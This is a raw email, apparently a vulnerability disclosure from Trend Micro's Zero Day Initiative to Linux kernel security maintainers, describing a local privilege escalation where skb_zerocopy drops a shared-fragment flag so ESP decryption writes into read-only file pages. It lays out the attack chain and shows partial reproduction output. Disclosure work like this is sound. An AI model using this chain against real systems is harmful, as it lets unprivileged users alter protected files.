Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.remote-ip=18.208.22.132
ARC-Seal: i=2; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=fail;
	t=1792619226;
	b=KLWA1iWeLE6vbrRK3MmcmtLQWtlukI/bJAA0vkqLDS6rGSeO6/Hwcn5h41qmYd/10oEJ
	 3BuQuy70nNOVZEugGMcgXYQBI+M6+Fjr63bL6xpJDFRtsgJONwrcAzgTaCfpxnZP08wka
	 TF1Q9ScywJLy696n0mrNm0SrHiiwhH+Aygghg2NT2tWllqqlhSQHi3UjNh2dvzK4CQXua
	 UlRiesepwMboYW7F+b+KhMe53qtYpchKsDECLk+EOnZcdYRkEQw5nDw3oTIB/wDnossQB
	 8Ic0j4iICtXJrtxcVU5wdMc+jPkmVrmE+q4MMZfjLRqNdH2IM3YolGZUiYeVMtB308Q==
ARC-Message-Signature: i=2; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1792619226;
	h=DMARC-Filter:Received:X-TM-MAIL-RECEIVED-TIME:X-TM-MAIL-UUID:
	 Received:Received:Received:From:To:CC:Subject:Thread-Topic:
	 Thread-Index:Content-Class:Date:Message-ID:Accept-Language:
	 Content-Language:X-MS-Has-Attach:X-MS-TNEF-Correlator:msip_labels:
	 x-ms-publictraffictype:x-ms-traffictypediagnostic:
	 x-ms-office365-filtering-correlation-id:
	 x-ms-exchange-atpmessageproperties:x-ms-exchange-senderadcheck:
	 x-ms-exchange-antispam-relay:x-microsoft-antispam:
	 x-microsoft-antispam-message-info:x-forefront-antispam-report:
	 x-ms-exchange-antispam-messagedata-chunkcount:
	 x-ms-exchange-antispam-messagedata-0:Content-Type:
	 Content-Transfer-Encoding:MIME-Version:
	 X-Exchange-RoutingPolicyChecked:X-OriginatorOrg:
	 X-MS-Exchange-CrossTenant-AuthAs:X-MS-Exchange-CrossTenant-AuthSource:
	 X-MS-Exchange-CrossTenant-Network-Message-Id:
	 X-MS-Exchange-CrossTenant-originalarrivaltime:
	 X-MS-Exchange-CrossTenant-fromentityheader:
	 X-MS-Exchange-CrossTenant-id:X-MS-Exchange-CrossTenant-mailboxtype:
	 X-MS-Exchange-CrossTenant-userprincipalname:
	 X-MS-Exchange-Transport-CrossTenantHeadersStamped:X-TM-AS-ERS:
	 X-TMASE-Version:X-TMASE-Result:X-TMASE-MatchedRID:X-TMASE-XGENCLOUD:
	 X-TM-Deliver-Signature:X-TM-Addin-Auth:X-TM-Addin-ProductCode:
	 DKIM-Signature;
	bh=9d3VoWdKkOcoxJHbYX9ApYHBWu6AKoEVLyHZJGJXyGY=;
	b=pF/Zuzo8f5uOP2fr2x7qHgneWuPg615oT4dAGpzBFM7MR2L30uhgVZvHwQD9ILMr3sYu
	 0t8OjiSsG8ij09NgBReNim1tey5eE/3AszBIkH33kl2Lj26brHEL2upgwwQvQ+xP5K2Dk
	 a8bMWCukt57hAQj37VKa7K6uqBtEOgupS1B/IOtOCCAjyvTYlRfFxHFb+9+blIqZ1y7MH
	 9/MEgKBmxadnP7JjybvpGcE0uOHghGlXkMqcme/zN2XyUe4o65PvG8tYDowtEgK1B5HvP
	 4V1ykdLD1jd1QwrnKNIuJYlz2SWE5UHnEFlldLKSb4nZH1loMMEU7HLCv2oe/H+QE2g==
ARC-Authentication-Results: i=2; smtp.subspace.kernel.org; 
	dmarc=pass header.from=trendmicro.com;
	spf=pass smtp.mailfrom=trendmicro.com;
	dkim=pass header.d=trendmicro.com header.i=@trendmicro.com header.a=rsa-sha256 header.s=TM-DKIM-20260724121021 header.b=kcn352NG;
	arc=fail smtp.remote-ip=18.208.22.132
Received: from repost01.tmes.trendmicro.com (repost01.tmes.trendmicro.com [18.208.22.132])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id B1760606A319
	for <netdev@vger.kernel.org>; Wed, 21 Oct 2026 21:47:04 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org B1760606A319
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=trendmicro.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=trendmicro.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=trendmicro.com header.i=@trendmicro.com header.a=rsa-sha256 header.s=TM-DKIM-20260724121021 header.b=kcn352NG
Received: from 40.107.209.21_.trendmicro.com (unknown [192.168.207.199])
	by repost01.tmes.trendmicro.com (Postfix) with SMTP id DED4AC000343;
	Wed, 21 Oct 2026 21:47:01 +0000 (UTC)
X-TM-MAIL-RECEIVED-TIME: 1792619216.006000
X-TM-MAIL-UUID: 414efa0e-fa20-42ea-82c9-cb3ab7cb8ef3
Received: from PH8PR06CU001.outbound.protection.outlook.com (unknown [40.107.209.21])
	by repre01.tmes.trendmicro.com (Trend Micro Email Security) with ESMTPS id 01CE9C000428;
	Wed, 21 Oct 2026 21:46:55 +0000 (UTC)
ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
 b=ZuL+ev7vSDEipPi3vF5m6sZix3AFHDj8ujm69uEaxPQ0org7CmKZnwEYZ8ksFYXOwvM4jJnKD4pFyFU1lwqnoz1pPRAdKlW3Oi6kO17cTbAvkK6YZUCmoX6VsbjsVsEXFqoq6MSjSkxKSZ6UGdAehq/HpHR+kmJVW3APjkakaYXp6OCARIPn/ai6Q5Qz6tCp6CcZ9ux0+0u+9wNSeKdq1fUYIq9IBzP1cniX1Zo2dmvdPjN3zREvzqE2hJmthIB/BnjIpb/yG52Y+ay7HCwGfI9s+pnJsq+VRU+dhVLV6cNTUx6e3oV0nWtEJpzYnYjpDc+wAJEowgKfzpq5XKjNgg==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector10001;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=iZrRw2YsqW6IEytQKc8KVtMcfh0HiaAASexOKsnE1x8=;
 b=WuCWZ1ap2s9aNzmIQZfCt4hVkHIeeeMMPkswaZ3b4YZfDdZsfeTxZQLzBHC7/wXm1+SuDXLLUhJuIgpMBdrBjS/EHFYWdda4nPfX+jVWD7XGuRyEtGI53q4WSKjTVkGFIgDAqDH/a2D4Eg0JmSFEPHCyu+GZBEjTI/9bDJyEe+C0xZIPh47Aql5vVUAWifD+9rLf9sNE5QUSg5X6ron+Fi5tX38SBrO56ymG9IuujcuSjnSY+sXGcjUn1IwJJAAtIi/E28ScM5+q5elsSsDSn+IO6u2mrqXkQPVX2laWRotOYKBlBw1c55jW/K+z5cKHA3XN4pMp696ykWqdK7Vniw==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=trendmicro.com; dmarc=pass action=none
 header.from=trendmicro.com; dkim=pass header.d=trendmicro.com; arc=none
Received: from BYAPR01MB3830.prod.exchangelabs.com (2603:10b6:a02:83::21) by
 LV3PR01MB8464.prod.exchangelabs.com (2603:10b6:408:1a3::7) with Microsoft
 SMTP Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
 15.21.546.15; Wed, 21 Oct 2026 21:46:49 +0000
Received: from BYAPR01MB3830.prod.exchangelabs.com
 ([fe80::29c9:1f31:48fd:8ccf]) by BYAPR01MB3830.prod.exchangelabs.com
 ([fe80::29c9:1f31:48fd:8ccf%5]) with mapi id 15.21.0522.017; Wed, 21 Oct 2026
 21:46:49 +0000
From: "zdi-disclosures@trendmicro.com" <zdi-disclosures@trendmicro.com>
To: "security@kernel.org" <security@kernel.org>
CC: "maintainer:NETWORKING [GENERAL" <davem@davemloft.net>, Eric Dumazet
	<edumazet@kernel.org>, Jakub Kicinski <kuba@kernel.org>, Paolo Abeni
	<pabeni@redhat.com>, Simon Horman <horms@kernel.org>, "open list:NETWORKING
 [GENERAL" <netdev@vger.kernel.org>, open list <linux-kernel@vger.kernel.org>
Subject: ZDI-CAN-33367: New Vulnerability Report
Thread-Topic: ZDI-CAN-33367: New Vulnerability Report
Thread-Index: Ad1hpZn1fKyykTsTTaGnGcgKDx92kQ==
Content-Class:
Date: Wed, 21 Oct 2026 21:46:49 +0000
Message-ID:
 <BYAPR01MB3830CECF5D0871064C59BA0280662@BYAPR01MB3830.prod.exchangelabs.com>
Accept-Language: en-US, es-ES
Content-Language: en-US
X-MS-Has-Attach:
X-MS-TNEF-Correlator:
msip_labels:
 MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_ActionId=c1736dd8-3e77-4047-88e2-d1dff27b3996;MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_ContentBits=0;MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_Enabled=true;MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_Method=Privileged;MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_Name=Public
 Information - no
 protection;MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_SetDate=2026-10-21T21:45:51Z;MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_SiteId=3e04753a-ae5b-42d4-a86d-d6f05460f9e4;MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_Tag=10,
 0, 1, 1;
x-ms-publictraffictype: Email
x-ms-traffictypediagnostic: BYAPR01MB3830:EE_|LV3PR01MB8464:EE_
x-ms-office365-filtering-correlation-id: 785dcdda-0641-487d-ca3e-08df2fbccfd2
x-ms-exchange-atpmessageproperties: SA
x-ms-exchange-senderadcheck: 1
x-ms-exchange-antispam-relay: 0
x-microsoft-antispam:
 BCL:0;ARA:13230040|366016|376014|23010399003|1800799024|6133799003|18002099003|17002099007|10067099003|55112099003|261021130227099003|261021121427099003|3023799007|261021135927099003|261021123027099003|260925021911599003|260925022911599003|11063799006|260925021311599003|261009221727099003|261009221227099003|261009223027099003|261009223327099003|5023799004|261021133027099003|56012099006|261009220027099003|38070700021;
x-microsoft-antispam-message-info:
 hCKkHoZCOsCXXBp/6hICWP4jHMG6rW6bb501sfetIIKnP4L2wKJzlaLz8Zqhy2J/jeVqnbNO/Cv523cxOiuv1Cgkg2oRbaaSIjTNrpTLlG2MiaH8xHnkqNhyLrZE1IdKJO4jo/qVD+DD+xm8DILCtzTgp5ll2Ld4UK2GHlKWGuv+1/ForiqIr6Eewp4CuTFLCMRps66tMie1VJA5FR2bDlO5g/cwjWGHqV5ydjzBqs4WAyHtbz7s6VVOt2VXpXR0A+oFpWd+hGrShYJotmHp/pUdKT4Hvau13pI9JorRifQKFJLVJockAWX+luMWjjtGwBM7XsIBncd2zI92dRcaJbmejY4l9ALqc3JpdS0tf7oqbOv7DWraM3dQcF3a6TR65mWH+U6oMxea+m3s2acDvOLrZUCN0JijyelFdJPpZhZWgc2mkCk70tYldDsab7hQiH0k47JwE+Egv8RcfDHALGNP9LzZ1IGXizl9MqjplhSgHU+5xCUNj75k1FzduRUrRlQJ93Vva+u2cYw0mBlSVUszPcPHuUJssiKOiSrNs0Gw63i+pSQfUGdPSvOxedgBt5srsUu764PolaDAkYvGKSN9RaHL8nA2hv2TVVTfLkswpn8Im0AB+BBlD76PeBlwhqienwzcxV6EBIFez44Fyi+1vClHFvqOYk2W7LVxWkk=
x-forefront-antispam-report:
 CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:BYAPR01MB3830.prod.exchangelabs.com;PTR:;CAT:NONE;SFS:(13230040)(366016)(376014)(23010399003)(1800799024)(6133799003)(18002099003)(17002099007)(10067099003)(55112099003)(261021130227099003)(261021121427099003)(3023799007)(261021135927099003)(261021123027099003)(260925021911599003)(260925022911599003)(11063799006)(260925021311599003)(261009221727099003)(261009221227099003)(261009223027099003)(261009223327099003)(5023799004)(261021133027099003)(56012099006)(261009220027099003)(38070700021);DIR:OUT;SFP:1101;
x-ms-exchange-antispam-messagedata-chunkcount: 1
x-ms-exchange-antispam-messagedata-0:
 =?us-ascii?Q?BNH5VTgmvIZtGcTb6j0O6y9XZF2VcZeNj6dR2d0+pRZ0gzED5Wh7OGWd/WRL?=
 =?us-ascii?Q?R+7Ojw44lsJXjEntvmNaf6vGBsES41argsF+rOCo8rxi96Yd+Hc7pYc3jqYj?=
 =?us-ascii?Q?9Gsuk2h9dhVjAaUYyiERl+olusou+Ug/8KEwR+wUjNrlqaeZgc40RUU5caNV?=
 =?us-ascii?Q?jN0D5saK/gXPBKWvdgAwqx6+lteZJmA3SNRlbrPut05C9lprgtGPthKISQYk?=
 =?us-ascii?Q?/Xp3IQC1uQpxT4idz/wK2HBSmZApTNnldmPvFKhX/nWO13ttMh2cCs5y2snN?=
 =?us-ascii?Q?7HDlcpczsoDA54UxvQnn1Ss2rg5y7WrnGiIhwAD6MP0AvidWkPUqIpf+GxX0?=
 =?us-ascii?Q?EhcZtmJcqGpUMdG2r69MG+YymrjcUJGvlDQji3aLdVFkKRiS7nUZUdjJ0HzK?=
 =?us-ascii?Q?BbLlHe0l+gLWmjZiMpteY7o6yuoX520pCZibMnozxOUdF4FkO7kco6AVsAfx?=
 =?us-ascii?Q?YUBmf3XJxgZlMqh8had53mrqozIOkuE/JIlKlWoqtj5K5dVsO4c6Rnd4oYad?=
 =?us-ascii?Q?1IaNJo2jXWxajFa46aZqlAZalQ7LWIAmgLFnCoPwyfFF11S/rUZU9OmYANE+?=
 =?us-ascii?Q?zYRISKjeKOsbTYKPNZfIX9YzNW+tXNmC8TPNs3c8hlgO2xxgdNXAJ5T0RBBb?=
 =?us-ascii?Q?sZq3HuDyugKDV6xxNMpyh6u6mgCdwyym0qSr1L7r1avT8SKynma9R3Cg08+m?=
 =?us-ascii?Q?m9BZMvUuCoTLPr+YiErJfbTiGN9k8+8ljUHycnzFNLYI4yXRDwr7jqTj+4nH?=
 =?us-ascii?Q?DzakmzVuYzBcqyRxOJu8z9LRtsU3ZlGEGZv6QXcNESfng+Igl1rmTpUsRHVF?=
 =?us-ascii?Q?OyAde27oN9+WTpKED9mLJiMlsbmF1bPpskd7aavySEKad77YYmS6h9ayqcR8?=
 =?us-ascii?Q?BSYvH8iBPB8MK4+jumu0eJjcMTOJJe9eeFw06L0lS85j+B04ZUjbd4kj3in5?=
 =?us-ascii?Q?7opJ9eSaSc8LpJHI7NQg74v/6Jb5+S6eieNv06l8M1QTFlIWg30PJ9upeGmw?=
 =?us-ascii?Q?ehCH9xI3o5nL6geFZgfpo7QNFcqNUVDY5otMh7vPe7lcWJyShR74w3H89XxO?=
 =?us-ascii?Q?Z8XyHTbjZATjcR/AZDTXqLU2dU0Q4EL7fxsQxLctGqKOLSeBbORzX7H/LAFz?=
 =?us-ascii?Q?Nq3Pzg1ZjdmWkIk0m5LXjzWmxV0e/U3408xP4YunXn8ozxBkxWamJe14I339?=
 =?us-ascii?Q?EnrsV1NOkUbn0qH1jWi4+S8JyJQux72KA7pq8JGorHndma717Ig35/CsFRf0?=
 =?us-ascii?Q?UCuL67/Bb1hfbnbnBOcOGDRY2xTmdrh4tJZ3dDv7OHhA9zMYLJN6iwV0I1eR?=
 =?us-ascii?Q?ct9kz8jFvTlHxNnEHojhKoEX8BVSvSRJQhUCuGlnkbTEHiOT4nfNx+/Kv8eH?=
 =?us-ascii?Q?NqWejLA1Cwp499T3NgE5ExKLRGhaF5XMGZSwmHN/7HPE0xgh7wqLaOxRao4A?=
 =?us-ascii?Q?hhhA3myq8vynk4ylpfeaGPOm04rE8TFQittdOTY9/QeWi6dEToPzuD58lbWV?=
 =?us-ascii?Q?E+7qzcM5O6k6bJv7yAGOEuA3nV5CQgJN5it+Yqr9C6Hro8W+GT9jgRCTOUCx?=
 =?us-ascii?Q?Il1QHlyczupN7gYfXB8M4LLbDciCh0pqV1FfiWgJpTsdVnTq4UQLapxxsPS9?=
 =?us-ascii?Q?xo8Wo8HJAf9QXaVW8r7ZgoFvZX1z98QYKNU92v1NSBSl1TtAQEfZSmuAmOT4?=
 =?us-ascii?Q?E6ONCkwqomRgmuDnOWlp2ARVv3i+JHlx636SfMFoXXIs0GUGp39YVwpBmZbX?=
 =?us-ascii?Q?DhzbRfrhCxedCxtE3dpJYZ7bUcsr4oY=3D?=
Content-Type: text/plain;
	charset="us-ascii"
Content-Transfer-Encoding: quoted-printable
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Post: <mailto:netdev@vger.kernel.org>
List-Help: <mailto:netdev+help@vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
List-Owner: <mailto:netdev+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
X-Exchange-RoutingPolicyChecked:
	iiep6OmaGIgVMZobPsJ/j1+5uKhD2ZMsRNe2k1UGiJZGFA1I4HYzE8bAveoYHkW5RWHnCB+1Z3816ZuNI9ibzeZF96EySVZ8xiGjGySv2Tt15GUnI9bB3j46rReH0rS02GoW2MNEuPeWVLcCWpO25/8KaCs+FEYrlUFWx8mdlkUjKcGMERNum3UIbN+VokSf7HGkqWllcgdlKjX144K+pXTVFdrHfeAImGKWWHfgvsNBjljTDQgnR+gLMX6/zDu60Dtm17bxjNRgArfuJ7YQxLx9HqcRWilcJmsDAGdAr1lVaHEj8ukyMxzG7vXOAsr+8mog0O/aRKUX0+elcEmdLA==
X-OriginatorOrg: trendmicro.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-AuthSource: BYAPR01MB3830.prod.exchangelabs.com
X-MS-Exchange-CrossTenant-Network-Message-Id: 785dcdda-0641-487d-ca3e-08df2fbccfd2
X-MS-Exchange-CrossTenant-originalarrivaltime: 21 Oct 2026 21:46:49.6132
 (UTC)
X-MS-Exchange-CrossTenant-fromentityheader: Hosted
X-MS-Exchange-CrossTenant-id: 3e04753a-ae5b-42d4-a86d-d6f05460f9e4
X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
X-MS-Exchange-CrossTenant-userprincipalname: vrCEa3MCGmaeDgXM6tGSUtFDgcpm1n45aYi80bqMfrlSTOWkcA0mV8Q8Svdu7WrEv24f512qiX0dTwxMqVoBYBI0uV0Z1BuaN4YlRglq/38=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: LV3PR01MB8464
X-TM-AS-ERS: 40.107.209.21-0.0.0.0
X-TMASE-Version: StarCloud-1.3-9.2.1014-30272.002
X-TMASE-Result: 10--36.217500-4.000000
X-TMASE-MatchedRID: dWURJeuh+/Zyv0jrUI8Jl2sl1BC8d8yLRBeqZfsmjCanBxDtydCHQAKL
	F8hh0gqc9nrnZ0jbWmAwMDihkJr6qLwNtLed/oQYri/MGNDKD8yF3V/JMHm7u6eeBvX7bSdN5jq
	b/qjiEAr8wtZXDSbfrH0HfgBMxNDGI9CG4ny51RKROlJUBa/drAqidEWyd229wovfPR2v+dS7iD
	72nUKkswMF7/0UOTLFWKi3EqLTKDCMrZJp87HjdvkEtEWR4iuF5yGfPzaydsDyQ6dAmPdzEuEKb
	xqb5I/nYVUEMZ8p0Sl/E2lIFGetFwCTgTqH8E4hdXYpcDl2V515ax/05CgrEfPUHiTfmYhcKQEK
	fqGnhxhn1wE+P/dAZTUV94Y4Iqmt35worqPuOItxfomV4XIWyiwOwdNmeyC43hA1lK5qE1xUrFW
	wTNw7+5mu4aLnSR1CJHKjiiKwwOV+6+ICUiAvnXtkjo+LN1qcsxvgDIrUqAYleAxROGnTT8IM32
	vgyZR+6HoLzTG0PtiQnF0MmGtKiR4YwfDHzP2RExCSOp4n2INjMKWkSPRjpb81t3rGD+B+kZ437
	11UireY+G7DBu7c+WaB4VbTxx2vv5dTTBbu+5L2zps7/HBWhVmRkWTYGxV9+xhy60HhOrPm4kfq
	YdQJGcqnDUIpcqeibzsd8/cjk8OSHvvm6PjHfZMNoosFs+Iauva7QpapAo0a3oXvkaIARsx7sga
	NDUWGxBw9om4Sz4iI3D7AeF3B651Jqn5dApRcWwFV7brvSSBmfvRT653FdGbAeW1mg1hxL4jBlb
	7Eu9CgNdQoXUYMFNpmoR7fK0Xc1PiYJ5USDcO+2acKtfdmATmoMBkrmuf/mCYM4MaoFU8QSZo0P
	rLGOq+eCSMeOiOkl1TB1A2F1mKN4P4XksxlV7dA+vQ5FeQh9sZwGSzm/nfbyADE/9Ozoge98bp2
	8iq6AcaXt2KLG5iaFLMxELUb2Q==
X-TMASE-XGENCLOUD: 4852f257-8083-4b00-92dd-8f2fb13e15ab-0-0-200-0
X-TM-Deliver-Signature: 35DBDDA464F924E90B891FCD2A2D53C7
X-TM-Addin-Auth: VsL084T3TK9MT/oBLXJL1gWjnjGHcPNtlMjKbhXfgESdonpvZM0lgWayDeX
	HJ+3i7yOu9/1XCDD4y85NUr7q1trwTjwc6mDuGU6sxOOiDN3kGXwr9KAz84BnjHAMmgK4JNDPeX
	4C9L8YGfr4ZmGlz5BtEh8auBt1TsD7gGqqkTsEPcAZ4m0wEYUpbqAub64TyozN9Bt/mYe5JWJi3
	fEjxV3lC+HPfaK46kyxSM8+ph+YewKHxXKbZDdin00Mhomnyg2SDIPnGKJIju4VNS9XEmIUxBKc
	ZDv/OUMEM9G9Lu+ouHo5FQRvBKth5aPC9eG9xFi1fjI/ObKcfUvxearMog==.hq3dlmK0m+o8hB
	BoYYT9+zFhsFaXJRLzKwrEVd45sfU6ASou3j9OP3gujNtBKZCqeF7VAduaqQzNDv0CFblSKS4mw
	MjJ/gD9enFkIaGk28yyrvYOluQBG/43EoqdErrIZnenAGLuDizvabPQHaWY0YHJG1KQhdbFbHE3
	ccGZzYZgLvtN2Xl6TUxFpe95DfqZDs/GzkCN5FsC6PrHbEBzjAx8ukmu1m/eIyc4FmTS/de80Oo
	B2assG1oEcGDvOqTjMCDsnn2yYV7aYdSi2JLWuHLFA4ymqA9XM6QDRgMLMBBjgnulIxOsF/+9Wt
	FmG2Gzrfr7u4Vay9JlUnIiwLE54A==
X-TM-Addin-ProductCode: EMS
DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple; d=trendmicro.com;
	s=TM-DKIM-20260724121021; t=1792619221; x=1792792021;
	bh=mskF1YMws9nJkTtjoIJoxSdF7pNWtAReFlaXHEuVVSQ=;
	h=From:To:Subject:Date:Message-ID:Content-Type:MIME-Version:From:To:
	 Date:Message-ID:Subject:Content-Type:Reply-To:MIME-Version;
	b=kcn352NGS8TtSfe6l49Wy9CTwjrHH47wPrb+cJUVzIwVkyWrZDFA/dSNoyzPYSFZ6
	 u4XU1llmrwO1kUXKIg5JKwFtO3Ade3Qo6/HGAZs+WhervI17nefCSX5Kxtw5TUunOi
	 tFoI/4Jp9BS/MxyfXaherRYguhOgby9FbPeWOtmfEOzgQuoGChW0kBafeiswaMMnrK
	 x+UXFFqEYIzoU01g9T6SEIp5Ck/AuO3G5yuzi4vz9DbhQGMlm7YP4mM3baxArlyoXh
	 xEYX+phAgvngXBBCp4XhVACgubgaVXfAd4AA/ONIul1VhpXpVevTbvhkz+qxg+65vc
	 TDMgdRkgFVWaA==

ZDI-CAN-33367: Linux Kernel skbuff skb_zerocopy Improper Ownership Manage=
ment Local Privilege Escalation Vulnerability

-- CVSS -----------------------------------------

7.8: AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

-- ABSTRACT -------------------------------------

Trend Micro's Zero Day Initiative has identified a vulnerability affectin=
g the following products:
Linux - Kernel

-- VULNERABILITY DETAILS ------------------------
* Version Tested:7.3-rc1
* Platform Tested:debian trixie

---

### Analysis

NFQUEUE constructs packet-bearing netlink messages with `skb_zerocopy()`.
The helper can transfer references to a page-backed source head and nonli=
near
fragments into the destination skb used for the `NFQA_PAYLOAD` attribute.
Although the page references and fragment descriptors are retained, the h=
elper
does not propagate the source skb's `SKBFL_SHARED_FRAG` ownership marker.

`SKBFL_SHARED_FRAG` tells later consumers that the fragment storage is no=
t
private to the skb. ESP input checks `skb_has_shared_frag()` when decidin=
g
whether nonlinear packet data must pass through `skb_cow_data()` before
authenticated decryption. If an intermediate transfer retains the backing
pages while erasing the marker, ESP can select an in-place decryption pat=
h for
storage that is not privately owned by the destination skb.

The demonstrated packet composition creates a splice-backed UDP skb conta=
ining
bytes from a file opened read-only, queues the packet to NFQUEUE, taps th=
e
resulting netlink skb through a netlink tap and `nlmon`, rewrites only th=
e
linear prefix into a valid authenticated ESP packet using traffic-control
`pedit`, and redirects the packet to loopback. The nonlinear file-backed
fragment remains attached. ESP then performs authenticated decryption ove=
r the
retained page-cache-backed bytes.

The resulting write crosses ordinary file-permission boundaries: an
unprivileged process can modify bytes belonging to a file that it can rea=
d but
cannot open for writing.

~~~C++
int
skb_zerocopy(struct sk_buff *to, struct sk_buff *from, int len, int hlen)
{
...
=09skb_shinfo(to)->nr_frags =3D j;

=09return 0;
}
~~~

At this point, `j` can represent a transferred page-backed source head or=
 one or more nonlinear source fragments.
The helper returns without merging `skb_shinfo(from)->flags & SKBFL_SHARE=
D_FRAG` into `skb_shinfo(to)->flags`.
The destination therefore retains source page references while losing the=
 state that describes their shared ownership.
`skb_zerocopy_clone()` handles zerocopy destructor metadata. It does not =
repair the splice-backed shared-fragment marker at this transfer boundary=
.


Here is the reproduce stdout
```
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
=3D=3D 4. create the target: unique 8 KiB root-owned mode-0444 non-execut=
able scratch file, fully synced (clean page cache)
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+ ssh -i /root/image/trixie.id_rsa -p 10021 -o StrictHostKeyChecking=3Dno=
 -o UserKnownHostsFile=3D/dev/null -o ConnectTimeout=3D10 root@127.0.0.1
rm -f /var/tmp/zf-scratch-8k.bin
dd if=3D/dev/urandom of=3D/var/tmp/zf-scratch-8k.bin bs=3D8192 count=3D1 =
status=3Dnone
chown root:root /var/tmp/zf-scratch-8k.bin
chmod 0444 /var/tmp/zf-scratch-8k.bin
sync
ls -la /var/tmp/zf-scratch-8k.bin
sha256sum /var/tmp/zf-scratch-8k.bin

Warning: Permanently added '[127.0.0.1]:10021' (ED25519) to the list of k=
nown hosts.
-r--r--r--. 1 root root 8192 Sep 10 19:19 /var/tmp/zf-scratch-8k.bin
a52335f7f41fbbb0ea7896689621111ae31a7426a2235ae066bfc1e7255990a6  /var/tm=
p/zf-scratch-8k.bin

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
=3D=3D 5. run the attack as the unprivileged user (all output below is th=
e validator's)
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+ ssh -i /root/image/trixie.id_rsa -p 10021 -o StrictHostKeyChecking=3Dno=
 -o UserKnownHostsFile=3D/dev/null -o ConnectTimeout=3D10 root@127.0.0.1 =
su -s /bin/bash testuser -c '/usr/local/bin/zerofrag-validate /var/tmp/zf=
-scratch-8k.bin 4160'
Warning: Permanently added '[127.0.0.1]:10021' (ED25519) to the list of k=
nown hosts.
ZFRAG_VALIDATOR mode=3Dharmless-scratch-file target=3D/var/tmp/zf-scratch=
-8k.bin offset=3D4160
KERNEL release=3D7.3.0-rc1 machine=3Dx86_64
TARGET_FILE uid=3D0 gid=3D0 mode=3D0444 size=3D8192 non_executable=3D1
TARGET_WINDOW_BEFORE (40 bytes):
  0000: 46 c1 ba d6 f9 d4 b8 71 00 c1 a0 82 cf a2 31 7a
  0010: fa c0 73 f9 c0 fd 0d 50 a2 d5 38 f8 21 69 b6 37
  0020: 5a b0 bd c6 32 9d 7e 9d
TARGET_SHA256_BEFORE=3Da52335f7f41fbbb0ea7896689621111ae31a7426a2235ae066=
bfc1e7255990a6
WRITE_DENIAL open(O_WRONLY) errno=3D13 (Permission denied) denied=3D1
USERNS unshare=3DOK userns_uid=3D0 netns=3Dfresh
SYSCTL lo/route_localnet=3D1 lo/accept_local=3D1
IP_LINK lo=3Dup nlmon0=3Dup
XFRM state=3D127.0.0.1-esp-0x100-transport policy=3Ddir_in auth=3Dhmac(sh=
a256)-128 enc=3Dcbc(aes)
